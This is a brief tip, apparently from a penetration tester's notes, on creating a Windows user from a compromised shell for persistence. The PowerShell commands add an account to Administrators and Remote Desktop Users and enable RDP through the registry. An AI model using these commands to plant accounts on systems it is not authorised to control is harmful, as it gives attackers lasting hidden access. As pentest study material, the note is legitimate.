# How to Quickly Add a User on Windows

author:: Nathan Acks  
date:: 2022-04-25

If you've got SYSTEM (or just even local admin) on a Windows box, you can quickly add a new user from your shell for persistence and/or RDP access (useful for Impacket, etc.).

```powershell
net user $USERNAME $PASSWORD /add
net localgroup Administrators $USER /add
net localgroup "Remote Desktop Users" $USER /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

## References

* [Alice with Siddicky (Student Mentor) (YouTube)](https://www.youtube.com/watch?v=Zma6Mk5bEI8)
